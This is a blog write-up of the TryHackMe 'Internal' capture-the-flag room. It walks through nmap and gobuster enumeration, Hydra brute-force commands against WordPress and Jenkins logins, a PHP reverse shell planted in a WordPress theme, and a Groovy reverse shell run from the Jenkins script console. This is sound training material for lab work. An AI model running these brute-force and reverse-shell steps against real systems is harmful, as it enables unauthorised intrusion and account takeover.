<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>TryHackMe: Internal write-up - bughunter.me</title><meta name="description" content="In this article, we'll delve into the solution to the 'Internal' TryHackMe Capture The Flag challenge. Our focus will be on the techniques used to&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta name="theme-color" content="#17181E" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#D73A42" media="(prefers-color-scheme: light)"><meta name="msapplication-navbutton-color" content="#D73A42"><meta name="apple-mobile-web-app-status-bar-style" content="#D73A42"><link rel="canonical" href="https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-internal-write-up/"><link rel="alternate" type="application/atom+xml" href="https://e4ld3rs0n.github.io/bughunter-publii/feed.xml"><link rel="alternate" type="application/json" href="https://e4ld3rs0n.github.io/bughunter-publii/feed.json"><meta property="og:title" content="TryHackMe: Internal write-up"><meta property="og:image" content="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/9/tryhackme-banner.jpg"><meta property="og:image:width" content="800"><meta property="og:image:height" content="440"><meta property="og:site_name" content="bughunter.me"><meta property="og:description" content="In this article, we'll delve into the solution to the 'Internal' TryHackMe Capture The Flag challenge. Our focus will be on the techniques used to&hellip;"><meta property="og:url" content="https://e4ld3rs0n.github.io/bughunter-publii//tryhackme-internal-write-up/"><meta property="og:type" content="article"><link rel="preload" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/dynamic/fonts/redhatmono/redhatmono.woff2" as="font" type="font/woff2" crossorigin><link rel="preload" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/dynamic/fonts/redhatmono/redhatmono-italic.woff2" as="font" type="font/woff2" crossorigin><link rel="stylesheet" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/css/style.css?v=7fa218a425dbbcb21ada335c561af1e5"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-internal-write-up/"},"headline":"TryHackMe: Internal write-up","datePublished":"2023-04-17T17:52+02:00","dateModified":"2025-01-26T18:11+01:00","image":{"@type":"ImageObject","url":"https://e4ld3rs0n.github.io/bughunter-publii/media/posts/9/tryhackme-banner.jpg","height":440,"width":800},"description":"In this article, we'll delve into the solution to the 'Internal' TryHackMe Capture The Flag challenge. Our focus will be on the techniques used to&hellip;","author":{"@type":"Person","name":"andrey","url":"https://e4ld3rs0n.github.io/bughunter-publii/authors/andrey/"},"publisher":{"@type":"Organization","name":"andrey"}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript></head><body class="post-template"><div class="container container--center"><header class="header"><div class="header__logo"><a class="logo" href="https://e4ld3rs0n.github.io/bughunter-publii/">bughunter.me</a></div><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/blog/" target="_self">blog</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/ctf/" target="_self">ctf</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/about-me/" title="About this blog" target="_self">whoami</a></li></ul></nav></header><main class="content"><article class="post"><header><h1 class="post__title">TryHackMe: Internal write-up</h1><div class="post__meta"><time datetime="2023-04-17T17:52" class="post__date">Monday, 17 April 2023 </time><span class="post__author"><a href="https://e4ld3rs0n.github.io/bughunter-publii/authors/andrey/" class="feed__author">andrey</a></span></div><div class="post__tags"><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/ctf/" class="invert">ctf</a> <a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/tryhackme/" class="invert">tryhackme</a></div></header><figure class="post__image post__cover"><img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/9/tryhackme-banner.jpg" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/9/responsive/tryhackme-banner-xs.jpg 300w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/9/responsive/tryhackme-banner-sm.jpg 480w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/9/responsive/tryhackme-banner-md.jpg 768w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/9/responsive/tryhackme-banner-lg.jpg 1024w" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" loading="eager" height="440" width="800" alt=""></figure><div class="post__entry"><p></p><p>In this article, we'll delve into the solution to the "Internal" TryHackMe Capture The Flag challenge. Our focus will be on the techniques used to enumerate and exploit both a WordPress blog and a Jenkins installation.</p><p></p><p></p><p>Link: <a href="https://tryhackme.com/room/internal" target="_blank" rel="noopener">https://tryhackme.com/room/internal</a></p><p></p><p></p><p>Difficulty: <code>Hard</code></p><p></p><p></p><p>Authors: <code>TheMayor</code></p><p></p><p></p><h2 class="wp-block-heading">Firsts steps and enumeration</h2><p></p><p></p><p>To begin I modified the /etc/hosts file and mapped the machine IP address to "internal.thm". Following that, I executed a customary nmap scan, the results of which are provided below:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group=""># Nmap 7.93 scan initiated Thu Apr 13 20:35:27 2023 as: nmap -sT -sC -v -p- -T5 -oN nmap.log internal.thmWarning: 10.10.55.68 giving up on port because retransmission cap hit (2).Nmap scan report for internal.thm (10.10.55.68)Host is up (0.051s latency).Not shown: 65041 closed tcp ports (conn-refused), 492 filtered tcp ports (no-response)PORT   STATE SERVICE22/tcp open  ssh| ssh-hostkey: |   2048 6efaefbef65f98b9597bf78eb9c5621e (RSA)|   256 ed64ed33e5c93058ba23040d14eb30e9 (ECDSA)|_  256 b07f7f7b5262622a60d43d36fa89eeff (ED25519)80/tcp open  http|_http-title: Apache2 Ubuntu Default Page: It works| http-methods: |_  Supported Methods: POST OPTIONS HEAD GETRead data files from: /usr/bin/../share/nmap# Nmap done at Thu Apr 13 20:38:14 2023 -- 1 IP address (1 host up) scanned in 166.83 seconds</pre><p></p><p></p><p>The scan revealed that the target is hosting an SSH server and Apache web server running the default web page. To further investigate, I utilized GoBuster:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">===============================================================Gobuster v3.5by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://internal.thm/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.5[+] Timeout:                 10s===============================================================2023/04/13 20:41:06 Starting gobuster in directory enumeration mode===============================================================/blog                 (Status: 301) [Size: 311] [--&gt; http://internal.thm/blog/]/wordpress            (Status: 301) [Size: 316] [--&gt; http://internal.thm/wordpress/]/javascript           (Status: 301) [Size: 317] [--&gt; http://internal.thm/javascript/]/phpmyadmin           (Status: 301) [Size: 317] [--&gt; http://internal.thm/phpmyadmin/]/server-status        (Status: 403) [Size: 277]===============================================================2023/04/13 20:59:54 Finished===============================================================</pre><p></p><p></p><p>It appears that the website is powered by Wordpress, and PHPMyAdmin is also present. My next course of action was to examine the Wordpress site, which features the standard default Wordpress blog template. The site only contains a single published article titled "Hello World!" authored by a user with the username "admin," which seems to be a legitimate username. Since there isn't much else available, I proceeded to access the /wp-admin page.</p><p></p><p></p><p>To confirm the validity of the "admin" username, I entered various combinations of fake usernames, which resulted in an "unknown username" error. However, when I tried to log in using the username "admin," I received an error message stating that "The password you entered for the username admin is incorrect."</p><p></p><p></p><p>To determine whether the password for the "admin" user is easily guessable, I utilized THC Hydra, which found it easily:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ hydra internal.thm http-form-post "/blog/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&amp;testcookie=1:Error" -l admin -P /usr/share/wordlists/rockyou.txt -w 5 -o hydra.log -vv# Hydra v9.4 run at 2023-04-14 15:36:50 on internal.thm......[80][http-post-form] host: internal.thm   login: admin   password: [REDACTED]</pre><p></p><p></p><h2 class="wp-block-heading">Reverse shell</h2><p></p><p></p><p>Since I was able to gain administrative access to Wordpress, I had access to its theme editor functionality, which allowed me to inject a PHP reverse shell into any page. I downloaded the PHP reverse shell from <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank" rel="noopener">pentestmonkey</a>, configured a netcat listener on my local machine, edited the IP and port in the PHP script, and opened the 404 template in Wordpress' Theme Editor. By replacing the contents of the page with the reverse shell and directing my browser to a non-existent blog page, I was able to obtain a shell as the <code>www-data</code> user on the target machine.</p><p></p><p></p><p>Since Python3 is installed on the target I used it to get a stable shell and then took a look on the system:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">www-data@internal:/$ lsbin    dev   initrd.img      lib64	 mnt   root  snap      sys  varboot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuzcdrom  home  lib	     media	 proc  sbin  swap.img  usr  vmlinuz.oldwww-data@internal:/$ ls /homeaubreannawww-data@internal:/$ ls /var/wwwhtmlwww-data@internal:/$ ls /var/www/htmlindex.html  wordpresswww-data@internal:/$ ls /optcontainerd  wp-save.txt</pre><p></p><p></p><p>While looking around, I stumbled upon a file named "wp-save.txt" in the /opt directory. To my surprise, it contained login credentials for the user "aubreanna":</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">www-data@internal:/$ cat /opt/wp-save.txtBill,Aubreanna needed these credentials for something later.  Let her know you have them and where they are.aubreanna:[REDACTED]</pre><p></p><p></p><p>Now that we have the login credentials for the user "aubreanna," we can log in via SSH and obtain a proper shell. Upon accessing the home directory of the user, we discovered the user flag and a file named "jenkins.txt" with the following content:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">aubreanna@internal:~$ cat jenkins.txt Internal Jenkins service is running on 172.17.0.2:8080</pre><p></p><p></p><h2 class="wp-block-heading">Root access with Jenkins</h2><p></p><p></p><p>Jenkins is a popular open-source automation server that helps to automate various parts of the software development process. It is primarily used for building, testing, and deploying software projects.</p><p></p><p></p><p>To gain access to the Jenkins instance, I established an SSH tunnel utilizing the credentials of "aubreanna":</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ ssh -L 8080:172.17.0.2:8080 <span class="obfuscated-email" data-user="smtjwsffs" data-domain="aflwjfsd.lze" data-type="text"></span></pre><p></p><p></p><p>With the SSH tunnel set up, I can now access the remote Jenkins instance by navigating to <a href="http://localhost:8080">http://localhost:8080</a> on my local machine, giving me the ability to interact with Jenkins as if I were directly in front of the target computer.</p><p></p><p></p><p>After conducting a quick search on Google, I discovered that the default credentials for Jenkins are "admin" and "password." I decided to use THC Hydra once again to attempt to brute force the "admin" account:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ hydra 127.0.0.1 -s 8080 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt -w 5 -o hydra-jenkins.log...[8080][http-post-form] host: 127.0.0.1   login: admin   password: [REDACTED]</pre><p></p><p></p><p>Jenkins has a useful feature that allows for the execution of custom scripts written in Groovy. Upon conducting further research online, I came across a straightforward <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76" target="_blank" rel="noopener">reverse shell script</a> that may allow me to obtain root privileges:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ nc -vlnp 9002listening on [any] 9002 ...connect to [10.8.46.10] from (UNKNOWN) [10.10.102.160] 36538whoamijenkinsls -alh /total 84Kdrwxr-xr-x   1 root root 4.0K Aug  3  2020 .drwxr-xr-x   1 root root 4.0K Aug  3  2020 ..-rwxr-xr-x   1 root root    0 Aug  3  2020 .dockerenvdrwxr-xr-x   1 root root 4.0K Aug  3  2020 bindrwxr-xr-x   2 root root 4.0K Sep  8  2019 bootdrwxr-xr-x   5 root root  340 Apr 17 16:55 devdrwxr-xr-x   1 root root 4.0K Aug  3  2020 etcdrwxr-xr-x   2 root root 4.0K Sep  8  2019 homedrwxr-xr-x   1 root root 4.0K Jan 30  2020 libdrwxr-xr-x   2 root root 4.0K Jan 30  2020 lib64drwxr-xr-x   2 root root 4.0K Jan 30  2020 mediadrwxr-xr-x   2 root root 4.0K Jan 30  2020 mntdrwxr-xr-x   1 root root 4.0K Aug  3  2020 optdr-xr-xr-x 123 root root    0 Apr 17 16:55 procdrwx------   1 root root 4.0K Aug  3  2020 rootdrwxr-xr-x   3 root root 4.0K Jan 30  2020 rundrwxr-xr-x   1 root root 4.0K Jul 28  2020 sbindrwxr-xr-x   2 root root 4.0K Jan 30  2020 srvdr-xr-xr-x  13 root root    0 Apr 17 17:42 sysdrwxrwxrwt   1 root root 4.0K Apr 17 16:55 tmpdrwxr-xr-x   1 root root 4.0K Jan 30  2020 usrdrwxr-xr-x   1 root root 4.0K Jul 28  2020 var</pre><p></p><p></p><p>It appears that we are currently confined within a Docker container, as indicated by the presence of the .dockerenv file. Nonetheless, while investigating further, I came across an interesting file located in the /opt directory:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">cat /opt/note.txtAubreanna,Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you need access to the root user account.root:[REDACTED]</pre><p></p><p></p><p>By using these credentials we can login as root on the target machine and get the final flag:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">aubreanna@internal:~$ su -Password: root@internal:~# ls /rootroot.txt  snaproot@internal:~# cat /root/root.txt THM{REDACTED}</pre><p></p><p></p><p></p></div><footer class="wrapper post__footer"><p class="post__last-updated">This article was updated on Sunday, 26 January 2025</p><div class="post__share"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Ftryhackme-internal-write-up%2F" class="js-share invert facebook" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#facebook"/></svg> <span>Facebook</span> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Ftryhackme-internal-write-up%2F" class="js-share invert linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://api.whatsapp.com/send?text=TryHackMe%3A%20Internal%20write-up https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Ftryhackme-internal-write-up%2F" class="js-share invert whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></footer><nav class="pagination"><div class="pagination__title"><span>Read other posts</span></div><div class="pagination__buttons"><a href="https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-opacity-write-up/" class="btn previous" rel="prev" aria-label="[MISSING TRANSLATION]:  TryHackMe: Opacity write-up "><span class="btn__icon">←</span> <span class="btn__text">TryHackMe: Opacity write-up</span> </a><a href="https://e4ld3rs0n.github.io/bughunter-publii/hackthebox-busqueda-write-up/" class="btn next" rel="next" aria-label="[MISSING TRANSLATION]:  HackTheBox: Busqueda write-up "><span class="btn__text">HackTheBox: Busqueda write-up</span> <span class="btn__icon">→</span></a></div></nav></article><div class="post__comments"><div class="comments"><div class="comments-wrapper"><h2>Comments</h2><div id="commento"></div><noscript>Please enable JS to use the comments form.</noscript><script type="text/javascript">var commento_element_to_check = document.getElementById('commento');

				if ('IntersectionObserver' in window) {
					var iObserver = new IntersectionObserver(
						(entries, observer) => {
							entries.forEach(entry => {
								if (entry.intersectionRatio >= 0.1) {
									(function () {
										var d = document, s = d.createElement('script');
										s.defer = true;
										s.setAttribute('data-no-fonts','true');
										s.setAttribute('data-page-id','9');
										s.setAttribute('data-hide-deleted','false');
										s.src = 'https://cdn.commento.io/js/commento.js';									
										(d.head || d.body).appendChild(s);
									})();
									observer.unobserve(entry.target);
								}
							});
						},
						{
							threshold: [0, 0.2, 0.5, 1]
						}
					);

					iObserver.observe(commento_element_to_check);
				} else {
					(function () {
						var d = document, s = d.createElement('script');
						s.defer = true;
						s.setAttribute('data-no-fonts','true');
						s.setAttribute('data-page-id','9');
						s.setAttribute('data-hide-deleted','false');
						s.src = 'https://cdn.commento.io/js/commento.js';
						(d.head || d.body).appendChild(s);
					})();
				}</script><script type="text/javascript"></script></div></div></div></main><footer class="footer"><div class="footer__inner"><div class="footer__copyright"><p>© 2023 - 2025 BugHunter</p></div></div></footer></div><script defer="defer" src="https://e4ld3rs0n.github.io/bughunter-publii/assets/js/scripts.min.js?v=c2232aa7558e9517946129d2a1b8c770"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'overlay',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
        for (var i = 0; i < images.length; i++) {
            if (images[i].complete) {
                images[i].classList.add('is-loaded');
            } else {
                images[i].addEventListener('load', function () {
                    this.classList.add('is-loaded');
                }, false);
            }
        }</script><script>class Rot18Encoder { constructor() { this.rotations = [ { from: 'a', to: 'z', offset: 18 }, { from: 'A', to: 'Z', offset: 18 }, { from: '0', to: '9', offset: 5 } ]; } _rotate(char, from, to, offset) { const charCode = char.charCodeAt(0); const fromCode = from.charCodeAt(0); const toCode = to.charCodeAt(0); const range = toCode - fromCode + 1; if (charCode >= fromCode && charCode <= toCode) { const shiftedCode = ((charCode - fromCode + offset) % range) + fromCode; return String.fromCharCode(shiftedCode); } return char; } encode(text) { let encodedText = ""; for(let char of text){ let rotatedChar = char; for (const rot of this.rotations){ rotatedChar = this._rotate(rotatedChar, rot.from, rot.to, rot.offset); } encodedText += rotatedChar; } return encodedText; } decode(text) { let decodedText = ""; for(let char of text){ let rotatedChar = char; for (const rot of this.rotations){ rotatedChar = this._rotate(rotatedChar, rot.from, rot.to, rot.to.charCodeAt(0) - rot.from.charCodeAt(0) + 1 - rot.offset); } decodedText += rotatedChar; } return decodedText; } } class TextProcessor { constructor(encoder){ this.encoder = encoder; } encode(text){ return this.encoder.encode(text); } decode(text){ return this.encoder.decode(text); } } document.addEventListener('DOMContentLoaded', function() { const rot18 = new Rot18Encoder(); const coder = new TextProcessor(rot18); var obfElements = document.querySelectorAll('.obfuscated-email'); obfElements.forEach(function(elem) { var dataType = elem.getAttribute('data-type'); var encodedEmail = elem.getAttribute('data-email'); var user = elem.getAttribute('data-user'); var domain = elem.getAttribute('data-domain'); var decodedEmail = ''; if (user && domain) { decodedEmail = coder.decode(user) + '@' + coder.decode(domain); } else if (encodedEmail) { const parts = encodedEmail.split('@'); if (parts.length === 2) { decodedEmail = coder.decode(parts[0]) + '@' + coder.decode(parts[1]); } else { decodedEmail = encodedEmail; } } if (dataType === 'mailto') { var originalText = elem.textContent.trim(); var a = document.createElement('a'); a.href = 'mailto:' + decodedEmail; if (elem.classList.length > 0) { a.className = elem.className; } if (originalText === '') { a.textContent = decodedEmail; } else { a.textContent = originalText; } elem.parentNode.replaceChild(a, elem); } else if (dataType === 'text') { var textNode = document.createTextNode(decodedEmail); elem.parentNode.replaceChild(textNode, elem); } }); });</script></body></html>